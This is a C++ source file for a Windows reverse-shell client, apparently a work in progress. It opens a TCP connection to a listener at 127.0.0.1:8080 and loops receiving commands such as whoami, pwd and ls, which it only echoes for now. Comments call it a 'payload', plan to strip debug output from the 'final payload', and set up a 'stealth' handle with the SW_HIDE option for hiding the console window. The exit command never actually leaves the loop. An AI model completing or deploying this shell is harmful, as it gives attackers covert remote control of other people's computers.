
//CPP Headers

#include <winsock2.h>   //Sock Head. Includes socket functions from socket lib.
#include <windows.h>    //Win API Head. Include Win API functions.
#include <ws2tcpip.h>   //TCP-IP Head. Definitions for TCP/IP protocols.
//C Headers

#include <stdio.h>      //Input/Output. Main input/output operations. Least required bytes in program.

//Debug Headers
//COMMENT OUT OF FINAL PAYLOAD.
#include <iostream>     //IN/OUT Debug Head. Only to print values to screen.

//LINKED IN CMAKE
#pragma comment(lib, "Ws2_32.lib")  //Link win32 lib with program. Winsocket will not work without.

#define DEFAULT_BUFLEN 1024 //Size of bytes sent and received over network.

/*
 * Function to host main socket code that connects to listener
 * */
void RevShell() {
    //Cannot create a socket without this data struture.
    WSADATA wsaver;     //Version info, system status, network connection, Maximum sockets, etc...

    //To check whether the compiled version of sockets is compatible with the older version of sockets.
    WSAStartup(MAKEWORD(2,2), &wsaver);

    SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    /*
     * AF_INet : IPV4 addressing schema. Address that socket can communicate with.
     * Sock_Stream : Stateful connection based streaming
     * IPProt_TCP : TCP/IP protocol
     */

    sockaddr_in address;    //Windows data struct that collects values of addressing schema to be used. IP address and port to connect to.
    address.sin_family = AF_INET;   //Assign the variable the address family.
    address.sin_addr.s_addr = inet_addr("127.0.0.1");   //IP Address to connect to. inet_addr() function converts the string from standard IPv4 dotted decimal notation, to an int value for used as an internet address.
    address.sin_port = htons(8080);     //The port to connect to. Converts unsigned short int hostshort from host-byte order to network-bye order.

    /*
     * "Connect" attempts to make connection to socket.
     * Checks for connection to socket failure.
     * If connection to address is a failure, throw socket error constant.
     * If error is confirmed closesocket() closes existing socket.
     * Then, WSACleanup() terminates Winsock 2 DLL.
     * */
    if (connect(tcpsock, (SOCKADDR*)&address, sizeof(address)) == SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        std::cout << "[Connected]. Input command..." << std::endl;

        char CommandGiven[DEFAULT_BUFLEN] = "";
        while (true) {
            /*
             * An infinite loop where the windows API function recv places the socket in blocking or nonblocking mode until exit
             * In blocking(synchronous) mode, the functions of the socket do not return until their actions are finished.
             *
            */
            int results = recv(tcpsock, CommandGiven, DEFAULT_BUFLEN, 0);   //int value of buffer. Recv() returns a message received from a socket.
            std::cout << "Recieved: " << CommandGiven;
            std::cout << "Length of command: " << results << std::endl;

            //Test1
            if ((strcmp(CommandGiven, "whoami") == 0)) {
                std::cout << "Parsed: whoami" << std::endl;
            }
            else if ((strcmp(CommandGiven, "pwd") == 0)) {
                std::cout << "Parsed: pwd" << std::endl;
            }
            else if ((strcmp(CommandGiven, "ls") == 0)) {
                std::cout << "Parsed: ls" << std::endl;
            }
            else if ((strcmp(CommandGiven, "exit") == 0)) {
                std::cout << "Parsed: exit" << std::endl;
                std::cout << "Ending connections..." << std::endl;
            }
            else {
                std::cout << "Command not parsed..." << std::endl;
            }
            memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
        }
    }
    //Standard cleanup.
    closesocket(tcpsock);
    WSACleanup();
    exit(0);

}


int main() {
    HWND stealth;   //Creates a window obj ect handle.
    /*
     * An application cannot access another object or resource directly.
     * So, to manage/modify other applications an object returns a handle which can be used by other applications.
     */
    AllocConsole(); //Assign a new console to the process.
    stealth = FindWindowA("ConsoleWindowClass", NULL);  //Find and attach stealth to the new window.
    ShowWindow(stealth, SW_SHOWNORMAL);
    /*
     * SW_SHOWNORMAL = 1 = Shown
     * SW_HIDE = 0 = Hidden
     */
    RevShell();
    return 0;
}

